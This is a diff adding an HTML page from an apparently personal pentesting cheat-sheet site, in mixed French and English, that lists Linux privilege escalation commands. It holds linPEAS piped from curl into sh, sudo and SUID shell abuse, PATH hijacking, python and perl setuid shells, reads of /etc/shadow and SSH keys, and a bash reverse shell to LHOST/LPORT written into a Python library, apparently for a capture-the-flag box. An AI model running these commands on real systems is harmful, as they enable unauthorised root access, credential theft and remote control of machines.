@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<link rel="icon" type="image/svg+xml" href="../assets/images/dragon-logo.svg">
+<link rel="icon" type="image/png" href="../assets/images/dragon-favicon.png">
+<title>Linux Privilege Escalation – Hacking Tools</title>
+<link rel="stylesheet" type="text/css" href="../assets/css/style.css">
+
+</head>
+
+<body class="theme-standard" data-page-key="tools-linux">
+<div class="wallpaper"></div>
+
+<div class="tool-section-nav"><a href="../index.html?page=dashboard" target="_top">&larr; Back to Dashboard</a></div>
+
+<h1 class="category-title">Linux Privilege Escalation</h1>
+
+<div class="grid">
+  <div class="modal" style="margin: 0 auto 3rem; max-width: 1000px; cursor: default;">
+    <table>
+      <tr><th>Tool</th><th>Description</th></tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-linpeas')">
+        <td>linPEAS</td><td>Automated Linux privesc checks</td>
+      </tr>
+      <tr id="cmd-linpeas" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Télécharger & lancer] — wget linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh</div>
+    <div>[Pipe direct] — curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</div>
+
+    <div class="comment-line">---- Output -----</div>
+    <div>[Sauvegarder en fichier] — ./linpeas.sh -a | tee linpeas.txt</div>
+    <div>[Sans couleurs (parsing)] — ./linpeas.sh -a -q &gt; linpeas.txt</div>
+
+    <div class="comment-line">---- Scope -----</div>
+    <div>[Scan rapide] — ./linpeas.sh -a</div>
+    <div>[Superfast (skip slow)] — ./linpeas.sh -s</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-pspy')">
+        <td>pspy</td><td>Monitor processes and cron jobs without root</td>
+      </tr>
+      <tr id="cmd-pspy" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Run (64-bit)] — ./pspy64</div>
+    <div>[Run (32-bit)] — ./pspy32</div>
+
+    <div class="comment-line">---- Options -----</div>
+    <div>[Commandes seulement] — ./pspy64 -pf -ci</div>
+    <div>[Sans couleurs] — ./pspy64 -nc</div>
+    <div>[Events fichiers] — ./pspy64 -d -i 1000</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-sudo')">
+        <td>sudo (misconfig)</td><td>Abuse sudo rules for privesc</td>
+      </tr>
+      <tr id="cmd-sudo" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Lister les droits sudo] — sudo -l</div>
+
+    <div class="comment-line">---- Abuse -----</div>
+    <div>[Shell root direct] — sudo /bin/bash</div>
+    <div>[Binaire NOPASSWD] — sudo &lt;binaire_autorisé&gt;</div>
+    <div>[Vérifier sur GTFOBins] — Comparer chaque binaire autorisé avec GTFOBins</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-suid')">
+        <td>SUID exploitation</td><td>Use SUID binaries to gain root</td>
+      </tr>
+      <tr id="cmd-suid" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Chercher les SUID] — find / -perm -4000 -type f 2&gt;/dev/null</div>
+    <div>[Chercher les SGID] — find / -perm -2000 -type f 2&gt;/dev/null</div>
+
+    <div class="comment-line">---- Analyse -----</div>
+    <div>[Comparer avec GTFOBins] — Vérifier chaque binaire trouvé sur GTFOBins</div>
+    <div>[Exemple find abusable] — find . -exec /bin/sh -p \; -quit</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-path')">
+        <td>PATH hijacking</td><td>Exploit insecure PATH usage</td>
+      </tr>
+      <tr id="cmd-path" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Prépendre un dossier writable] — export PATH=/tmp:$PATH</div>
+    <div>[Voir le PATH actuel] — echo $PATH</div>
+
+    <div class="comment-line">---- Abuse -----</div>
+    <div>[Planter un faux binaire] — echo -e '#!/bin/bash\nbash -p' &gt; /tmp/ls; chmod +x /tmp/ls</div>
+    <div>[Déclencher via SUID/script] — Exécuter le binaire/script vulnérable qui appelle l'outil détourné</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-capabilities')">
+        <td>Capabilities</td><td>Abuse Linux capabilities for privesc</td>
+      </tr>
+      <tr id="cmd-capabilities" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Lister toutes les capabilities] — getcap -r / 2&gt;/dev/null</div>
+
+    <div class="comment-line">---- Abuse examples -----</div>
+    <div>[python cap_setuid] — python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</div>
+    <div>[perl cap_setuid] — perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'</div>
+
+  </td>
+</tr>
+
+
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-information-for-privesc')">
+        <td style="color:red">What to search for</td><td>privesc</td>
+      </tr>
+      <tr id="cmd-information-for-privesc" class="command-row">
+        <td colspan="2" class="command-cell">
+
+            <div class="comment-line">ssh pour obtenir shell</div>
+            <div>Essayer de se SSH ? ssh [USR]@[IP]</div>
+            <div class="comment-line">Environment</div>
+            <div>cat /etc/os-release</div>
+
+            <div class="comment-line">---- Voir les history commands -----</div>
+            <div style="color:rgb(212, 53, 212)">history | tail -100</div>
+            <div style="color:rgb(212, 53, 212)">cat .zsh_history</div>       
+            
+            <div class="comment-line">---- Crontabs ----- (Modify for reverse shell @3am )</div>
+            <div >cat /etc/crontab</div> 
+
+            <div class="comment-line">---- Access key ----- </div>
+            <div >ls -la ~/.ssh/</div> 
+            <div >cat /etc/hosts</div> 
+
+            <div class="comment-line">---- Docker container ? ----- </div>
+            <div >cat /proc/1/environ | tr '\0' '\n'</div> 
+
+            <div class="comment-line">---- Folder/Files -----</div>
+            <div>/opt</div>
+
+            <div class="comment-line">---- Username/Password : Look for /bash or /Zsh (Real user)-----</div>
+            <div>cat /etc/passwd</div>
+            <div>cat /etc/shadow</div>
+            <div>grep -v "nologin" /etc/passwd</div>
+
+            <div class="comment-line">---- Règles de sudo misconfig/oublie -----</div>
+            <div>/etc/sudoers.d/</div>
+            <div>sudo -l</div>                 
+            <div class="comment-line">Voir qui peut modifier un fichier Ex: user death qui peut modifier pour escalader</div>
+            <span style="color:red">Attendre que morpheus launch le fichier contenant la lib shutil.py</span>
+            <span style="color:red">ls -l pour voir qui peut modifier</span>
+            <div>ls -l /usr/lib/python3.8/shutil.py </div>                   
+            <span style="color:red">modifier le fichier & mettre un reverse shell</span>
+            <div>echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0>&1'\")" > /usr/lib/python3.8/shutil.py</div>
+            <span style="color:red">Attendre morpheus</span>
+            <div class="comment-line">---- Misconfigure right ? -----</div>
+            
+            <div class="comment-line">---- Example here python is allowed root access -----</div>
+            <div>sudo -u death /usr/bin/python3 /home/death/getDreams.py</div>
+        </td>
+      </tr>
+
+
+
+    </table>
+  </div>
+</div>
+
+<script>
+  const embedded = window.self !== window.top;
+
+  // Tell the hub's modal our real content height. Called synchronously on
+  // the one interaction that changes it (toggling a command row) so there's
+  // no dependency on observer/timer scheduling; ResizeObserver below is
+  // just a fallback for anything else (initial layout, font swaps, etc).
+  function reportHeight() {
+    if (embedded) {
+      window.parent.postMessage({ type: "tool-frame-height", height: document.body.scrollHeight }, "*");
+    }
+  }
+
+  function toggleCmd(id) {
+    const row = document.getElementById(id);
+    row.style.display = (row.style.display === "table-row") ? "none" : "table-row";
+    reportHeight();
+  }
+
+  (function() {
+    const savedTheme = localStorage.getItem("/settings.html") || "standard";
+    document.body.classList.add("theme-" + savedTheme);
+    if (embedded) document.body.classList.add("embedded");
+  })();
+
+  if (embedded) {
+    new ResizeObserver(reportHeight).observe(document.body);
+    window.addEventListener("load", reportHeight);
+  }
+</script>
+
+<script src="../config/tools/linux.js"></script>
+<script src="../assets/script/wallpaper-loader.js"></script>
+<script src="../assets/script/theme-accent.js"></script>
+<script src="../assets/script/copy-commands.js"></script>
+<script src="../assets/script/page-effects.js"></script>
+<script src="../assets/script/page-effects-loader.js"></script>
+<script>
+  applyWallpaper(toolsLinuxConfig.background, "tools-linux");
+</script>
+
+</body>
+</html>
